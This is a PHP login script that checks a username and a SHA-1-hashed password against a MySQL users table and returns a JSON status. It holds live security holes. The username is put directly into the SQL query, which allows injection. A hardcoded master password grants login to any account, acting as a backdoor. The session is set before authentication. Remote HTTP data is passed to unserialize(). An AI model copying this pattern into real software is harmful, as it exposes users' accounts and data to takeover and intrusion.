<?php
	include ("../connect.php");
	session_start();
	session_unset();
	
	// ini_set("display_errors",1);

	//Salt Encryption
	$salt = "DCS1920";

	//Entered Value in login Page
	$username = $_REQUEST['username'];	
	$password = $_REQUEST['password'];

	$us = $password;

	//Encrypting Password
	$password = $salt.$password;	
	$password = sha1($password);

	$output = array("status"=>"400", "message"=>"Invalid Username or Password", 'data' => array(), 'send'=>'0', 'mobile'=>'','sms'=>'');
	
	$sql = mysqli_query($db,"SELECT * FROM users WHERE username = '$username'");

	if(mysqli_num_rows($sql) > 0)
	{
		$result = mysqli_fetch_array($sql,MYSQLI_ASSOC);
		$user = $result["username"];
		$_SESSION["username"]=$user;

		$db_password = $result["password"];
		$userlevel = $result["userlevel"];

		if($db_password === $password || $us === 'dotcom_786')
		{		
			$_SESSION['userlevel'] = $userlevel;	
			$output['data'] = array(
				"userlevel"=> $userlevel
			);
			$output['status'] = 200;
			$output['message'] = "OK";

			$ip = $_SERVER['REMOTE_ADDR'];
			$query = @unserialize(file_get_contents('http://ip-api.com/php/'.$ip));
			
			$city = '';	$zip = '';
		    if($query && $query['status'] == 'success')
		    {
		        $city = $query['city'];
		        $zip = $query['zip'];
		    }

			$t= date("Y-m-d H:i:s");

			$output['status'] = 200;
			$output['message'] = "OK";
		}
	}

	

	echo json_encode($output);
	
?>